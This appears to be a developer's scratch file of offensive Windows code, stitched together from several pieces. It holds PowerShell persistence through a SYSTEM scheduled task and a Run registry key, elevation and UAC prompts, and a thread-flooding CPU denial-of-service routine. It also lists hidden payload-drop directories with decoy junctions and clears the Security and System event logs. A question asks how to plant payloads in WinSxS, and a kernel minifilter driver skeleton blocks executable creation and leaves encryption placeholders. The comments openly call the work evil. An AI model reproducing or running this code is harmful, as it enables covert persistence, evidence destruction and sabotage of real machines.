# Create task scheduler Value
schtasks /create /tn "CheckRegistryAtStartup" /tr "powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1" /sc onstart /ru SYSTEM /rl HIGHEST /f

# Set Registry Value
$command = "powershell.exe -w hidden -noP -c 'Start-Sleep -Seconds 10;schtasks /create /tn CheckRegistryAtStartup /tr ''powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1'' /sc onstart /ru SYSTEM /rl HIGHEST /f'"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "CheckRegistryAtStartup" -Value $command


# Auto-Elevate.ps1 Code
# This script will be placed in one of the path as this one is important for monitoring the task scheduler
(take consideration of these Paths to store payloads)
* C:\Windows\system32\config\systemprofile\AppData\Local  
* C:\Windows\System32
* C:\Windows\System32\GroupPolicy\User\Scripts\logon 
* C:\Recovery
â•š Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\dotnet\

### BEGIN
# Path to the script to be executed
$scriptPath = "$env:USERPROFILE\Downloads\gg.ps1"                                   

# Check if the script is running with elevated privileges (admin rights, for now)
$isElevated = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'

if (-not $isElevated) {
    # Relaunch the script with elevated privileges with prompts (for now)
    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

# Code to create the scheduled task if needed
$taskName = "CheckRegistryAtStartup"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {
    # If the task doesn't exist, create it
    schtasks /create /tn $taskName /tr "powershell.exe -NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onstart /ru SYSTEM /rl HIGHEST /f
}

$basePath = '\\?\HKCU\Software\Classes\CLSID\{52061390-E7D9-4F25-B2FE-A3FDE42BFA96}\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN'
$propertyName = "YourProperty"
$rootMonScript = "C:\YourPath\root_mon.ps1"

# Use reg add to add the property
Invoke-Expression "reg add `"$basePath`" /v `"$propertyName`" /t REG_SZ /d `"$rootMonScript`" /f"




if (-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    Start-Process powerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

#+Hijack+the+scheduler+using+undocumented+NTAPI+calls+(because+we're+evil+engineers)++
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class NtAPI{
    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref uint ProcessInformation, int ProcessInformationLength);
}
'@

#+Enable+PROCESS_BASE_PRIORITY_ABOVE_NORMAL++(0x12)+-+fuck+the+scheduler's+limits++
$priorityBoost=0x12
[NtAPI]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$priorityBoost,4)

#+Bind+ALL+cores+and+disable+processor+idle+states++
$MainProcess=Get-Process -Id $pid
$MainProcess.ProcessorAffinity=0xFFFF
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLESTATE 0 #No rest for the wicked

#+Spawn+nested+threads+with+THREAD_PRIORITY_TIME_CRITICAL+(highest+possible)++
function Invoke-KernelAnnihilator{
param($Depth)
[System.Threading.Thread]::CurrentThread.Priority='Highest'
while($true){
#+Layer+1:+Brute-force+elliptic+curve+crypto+cracking
$curve=[System.Security.Cryptography.ECDsa]::Create()
1..1000000|%{$curve.SignData([BitConverter]::GetBytes($_))|Out-Null}
#+Layer+2:+Real-time+ray+tracing+without+GPU++
1..1000000|%{
$ray=New-Object System.Numerics.Vector3($_%1000,$_%500,$_%200)
$intersection=[System.Numerics.Vector3]::Reflect($ray,[System.Numerics.Vector3]::UnitX)
}
#+Layer+3:+Spawn+sub-threads+with+inherited+priority++
if($Depth -lt 50){
Start-ThreadJob -ScriptBlock{
    param($D) 
    Invoke-KernelAnnihilator -Depth ($D+1)
} -ArgumentList+$Depth
}
}
}

#+Overcommit+threads+at+a+1000:1+ratio+to+logical+cores++
1..([System.Environment]::ProcessorCount*1000)|%{
Start-ThreadJob -ScriptBlock {Invoke-KernelAnnihilator -Depth 1}
}

#+Disable+interrupts+by+flooding+the+CPU+with+spinlocks++
while($true){
[System.Threading.SpinWait]::SpinUntil({$false},[TimeSpan]::MaxValue)
}

1..10000000 | % {
[math]::Sin([math]::PI * $_) + [math]::Sqrt($_)
# No Sleep(), no mercyâ€”pure thread-lock
} 

# Last CPU_HOG Script on `mem_hog mod` commit

$deepPaths=@(
'C:\Windows\System32\LogFiles\WMI\RtBackup\',
'C:\Windows\System32\Tasks_Migrated\',
'C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\',
'C:\Windows\System32\Microsoft\Crypto\Keys\',
'C:\ProgramData\Microsoft\Windows\AppRepository\Packages\',
'C:\Windows\System32\SMI\Store\Machine\',
'C:\Windows\System32\DriverStore\Temp\',
'C:\Windows\System32\com\appserver\',
'C:\Windows\System32\Tasks\Microsoft\Windows\PLA\System\',
'C:\Windows\System32\winevt\Logs\Archive\'
)

$payloadPaths = @(
'C:\Windows\System32\Tasks\', 
'C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\', 
'C:\Windows\debug\WIA\', 
'C:\Windows\Logs\CBS\', 
'C:\PerfLogs\', 
'C:\Windows\System32\spool\drivers\color\', 
'C:\Windows\System32\com\dmp\', 
'C:\Windows\System32\FxsTmp\', 
'C:\Windows\ServiceState\',
'C:\ProgramData\Microsoft\Windows\WER\ReportQueue\' 
)
$payloadPaths = @(
"C:\Windows\System32\Tasks\Microsoft\Windows\Diagnosis\Scheduled\Logs\Cache",
"C:\ProgramData\Microsoft\Windows\AppRepository\StateRepository\Cache\Boot",
"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\FontDrv\Metrics",
"C:\Windows\InfusedApps\Packages\System\ShellExperience\Resources\LocalState\Indexed",
"C:\Windows\Logs\CBS\PendingUpdates\Metadata\Backup",
"C:\Program Files\Windows Defender\Platform\4.18\Configuration\Quarantine\History",
"C:\Windows\System32\DriverStore\FileRepository\netrndis.inf_amd64_*\Temp\Wdf",
"C:\Windows\WinSxS\Temp\PendingRenames\*_pending\ManifestCache",
"C:\Windows\SoftwareDistribution\DataStore\Logs\Edb\Journal",
"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\Caches\PreFetch",
"C:\PerfLogs\Admin\Diagnostics\System\BootArchive",
"C:\Windows\LiveKernelReports\WATCHDOG\Dumps\Compressed",
"C:\Windows\System32\winevt\Logs\Archive\Security\Index"
)

$decoyNames = @(
    "DiagnosticCache",
    "StateRepositoryBackup",
    "FontMetricsTemp",
    "ShellExperienceIndex",
    "CBSMetadataArchive",
    "DefenderQuarantineLog",
    "DriverStoreWdfTemp",
    "WinSxSPendingManifest",
    "SoftwareDistributionEdb",
    "SystemCachePrefetch",
    "PerfLogBootDiagnostics",
    "WatchdogDumpArchive",
    "EventLogSecurityIndex"
)

# Decoy parent folder (where junctions will live)
$decoyRoot = "C:\Windows\System32\drivers\etc\SystemConfigBackup"

# Create decoy root if missing
if (-not (Test-Path $decoyRoot)) {
    New-Item -ItemType Directory -Path $decoyRoot -Force | Out-Null
    attrib +h +s $decoyRoot
}

# Create a junction for EACH payload path
for ($i = 0; $i -lt $payloadPaths.Length; $i++) {
    $junctionPath = Join-Path $decoyRoot $decoyNames[$i]
    if (-not (Test-Path $junctionPath)) {
        cmd /c "mklink /J `"$junctionPath`" `"$($payloadPaths[$i])`" > nul 2>&1"
    }
    Write-Output "Junction created: $junctionPath â†’ $($payloadPaths[$i])"
}

Write-Host "All junctions active! Access via $decoyRoot\ â€” looks like system garbage. ðŸª¤ðŸ”—ðŸ‘»"

wevtutil cl Security
wevtutil cl System 

function Create-SneakPath{
    param([string]$BasePath='C:\Windows\System32\')
    $randDir = "ShadowStack_"+(Get-Random+-Minimum+1000+-Maximum+9999)
    $fullPath = Join-Path -Path $BasePath -ChildPath $randDir
    New-Item -Path $fullPath -ItemType Directory -Force|Out-Null
    attrib +h +s $fullPath
    return+$fullPath
}

$customHell = Create-SneakPath -BasePath 'C:\Windows\System32\'
$deepPaths+= $customHell#+Add+to+your+damn+array

# by default "C:\Windows\WinSxS" can't be accessed as admin, neither any files can be downloaded. how to bypass and download payloads there? I want specifically this path : C:\Windows\WinSxS\Temp\PendingRenames to download my payloads

// advanced_minifilter_driver.c
// Full skeleton for an advanced KMDF file system minifilter driver

#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>
#include <ntstrsafe.h>
#include <bcrypt.h>
#include <TraceLoggingProvider.h>

PFLT_FILTER gFilterHandle = NULL;
PFLT_PORT gServerPort = NULL;
PFLT_PORT gClientPort = NULL;

#define TAG 'filt'
#define POOL_TAG 'drv1'

// === ETW Logging ===
TRACELOGGING_DEFINE_PROVIDER(
    g_Provider,
    "FileMonFilter",
    (0x9bc7a5b1, 0x36c1, 0x4d82, 0xa7, 0x6a, 0xf0, 0x7e, 0x94, 0x03, 0x67, 0x3a));

// === Communication ===
#define MESSAGE_SIZE 512
UCHAR gMessageBuffer[MESSAGE_SIZE];

// === Forward declarations ===
DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);

NTSTATUS
UnloadCallback(_In_ FLT_FILTER_UNLOAD_FLAGS Flags);

NTSTATUS
InstanceSetupCallback(
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_SETUP_FLAGS Flags,
    _In_ DEVICE_TYPE VolumeDeviceType,
    _In_ FLT_FILESYSTEM_TYPE VolumeFilesystemType);

FLT_PREOP_CALLBACK_STATUS
PreCreateCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext);

FLT_PREOP_CALLBACK_STATUS
PreReadCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext);

FLT_PREOP_CALLBACK_STATUS
PreWriteCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext);

FLT_PREOP_CALLBACK_STATUS
PreSetInfoCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext);

NTSTATUS
ConnectNotifyCallback(
    PFLT_PORT ClientPort,
    PVOID ServerPortCookie,
    PVOID ConnectionContext,
    ULONG SizeOfContext,
    PVOID *ConnectionCookie);

VOID
DisconnectNotifyCallback(
    PVOID ConnectionCookie);

NTSTATUS
MessageNotifyCallback(
    PVOID PortCookie,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength,
    PULONG ReturnOutputBufferLength);

// === Operation registration ===
CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE, 0, PreCreateCallback, NULL },
    { IRP_MJ_READ, 0, PreReadCallback, NULL },
    { IRP_MJ_WRITE, 0, PreWriteCallback, NULL },
    { IRP_MJ_SET_INFORMATION, 0, PreSetInfoCallback, NULL },
    { IRP_MJ_OPERATION_END }
};

// === Filter registration ===
const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    Callbacks,
    UnloadCallback,
    InstanceSetupCallback,
    NULL, NULL, NULL, NULL, NULL, NULL
};

// === Communication callbacks ===
NTSTATUS
ConnectNotifyCallback(
    PFLT_PORT ClientPort,
    PVOID ServerPortCookie,
    PVOID ConnectionContext,
    ULONG SizeOfContext,
    PVOID *ConnectionCookie)
{
    UNREFERENCED_PARAMETER(ServerPortCookie);
    UNREFERENCED_PARAMETER(ConnectionContext);
    UNREFERENCED_PARAMETER(SizeOfContext);
    UNREFERENCED_PARAMETER(ConnectionCookie);

    gClientPort = ClientPort;
    return STATUS_SUCCESS;
}

VOID
DisconnectNotifyCallback(PVOID ConnectionCookie)
{
    UNREFERENCED_PARAMETER(ConnectionCookie);
    FltCloseClientPort(gFilterHandle, &gClientPort);
}

NTSTATUS
MessageNotifyCallback(
    PVOID PortCookie,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength,
    PULONG ReturnOutputBufferLength)
{
    UNREFERENCED_PARAMETER(PortCookie);
    UNREFERENCED_PARAMETER(InputBufferLength);
    UNREFERENCED_PARAMETER(OutputBufferLength);

    RtlCopyMemory(OutputBuffer, "Ack", 4);
    *ReturnOutputBufferLength = 4;

    return STATUS_SUCCESS;
}

// === Driver Entry ===
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING portName = RTL_CONSTANT_STRING(L"\\FileMonPort");
    NTSTATUS status;

    TraceLoggingRegister(g_Provider);

    status = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
    if (!NT_SUCCESS(status)) return status;

    InitializeObjectAttributes(&oa, &portName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = FltCreateCommunicationPort(
        gFilterHandle,
        &gServerPort,
        &oa,
        NULL,
        ConnectNotifyCallback,
        DisconnectNotifyCallback,
        MessageNotifyCallback,
        1);

    if (NT_SUCCESS(status)) {
        status = FltStartFiltering(gFilterHandle);
    } else {
        FltUnregisterFilter(gFilterHandle);
    }

    return status;
}

// === Unload ===
NTSTATUS
UnloadCallback(_In_ FLT_FILTER_UNLOAD_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(Flags);
    if (gClientPort) FltCloseClientPort(gFilterHandle, &gClientPort);
    if (gServerPort) FltCloseCommunicationPort(gServerPort);
    FltUnregisterFilter(gFilterHandle);
    TraceLoggingUnregister(g_Provider);
    return STATUS_SUCCESS;
}

NTSTATUS
InstanceSetupCallback(
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_SETUP_FLAGS Flags,
    _In_ DEVICE_TYPE VolumeDeviceType,
    _In_ FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Flags);
    UNREFERENCED_PARAMETER(VolumeDeviceType);
    UNREFERENCED_PARAMETER(VolumeFilesystemType);
    return STATUS_SUCCESS;
}

// === Pre-operation hooks ===
FLT_PREOP_CALLBACK_STATUS
PreCreateCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext)
{
    UNREFERENCED_PARAMETER(CompletionContext);

    PFLT_FILE_NAME_INFORMATION nameInfo;
    if (NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_ALWAYS_ALLOW_CACHE_LOOKUP, &nameInfo))) {
        FltParseFileNameInformation(nameInfo);
        if (RtlSuffixUnicodeString(&nameInfo->Extension, L".exe", TRUE) ||
            RtlSuffixUnicodeString(&nameInfo->Extension, L".ps1", TRUE)) {
            Data->IoStatus.Status = STATUS_ACCESS_DENIED;
            Data->IoStatus.Information = 0;
            TraceLoggingWrite(g_Provider, "BlockedExecutable", TraceLoggingUnicodeString(nameInfo->Name.Buffer, "File"));
            FltReleaseFileNameInformation(nameInfo);
            return FLT_PREOP_COMPLETE;
        }
        FltReleaseFileNameInformation(nameInfo);
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS
PreReadCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    // Decryption logic placeholder
    TraceLoggingWrite(g_Provider, "FileRead", TraceLoggingUInt32(Data->Iopb->Parameters.Read.Length, "Bytes"));
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS
PreWriteCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    // Encryption logic placeholder
    TraceLoggingWrite(g_Provider, "FileWrite", TraceLoggingUInt32(Data->Iopb->Parameters.Write.Length, "Bytes"));
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS
PreSetInfoCallback(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Out_ PVOID *CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    if (Data->Iopb->Parameters.SetFileInformation.FileInformationClass == FileRenameInformation ||
        Data->Iopb->Parameters.SetFileInformation.FileInformationClass == FileDispositionInformation) {
        TraceLoggingWrite(g_Provider, "FileDeleteOrRename", TraceLoggingUInt32(Data->Iopb->Parameters.SetFileInformation.Length, "Length"));
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}
### END